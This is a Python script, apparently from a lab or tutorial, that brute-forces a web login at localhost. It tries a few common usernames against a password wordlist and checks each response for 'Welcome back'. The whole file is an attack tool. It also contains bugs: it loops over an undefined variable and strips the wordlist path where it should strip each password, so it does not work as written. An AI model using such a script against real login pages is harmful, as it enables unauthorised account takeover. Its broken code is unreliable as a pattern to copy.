#!/usr/bin/env python3

# Import modules
import requests
import sys

# Set the target
target = "http://127.0.0.1:5000"

# Usernames to bruteforce
usernames = ["admin", "user", "test"]

# Passwords to try
passwords = "/usr/share/john.lst"

# Needle for success confirmation
needle = "Welcome back"


# Iterate through the usernames
for user in usernames:
	# Open the password lists
	with open(passwords, "r") as passwords_list:
		for password in password_lists:
			# format the password and removed the new line
			password = passwords.strip("\n").encode()
			# Print out current progress
			sys.stdout.write("[X] Attempting user:password: {}:{}".format(user,password.decode()))
			sys.stdout.flush()
			# Make the request
			r = requests.post(target, data={"username": user, "password": password})
			# Verify the request was successful with needle variable
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'.".format(password.decode(), user))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("[X] Login credentials not found.")
		sys.stdout.write("\n")
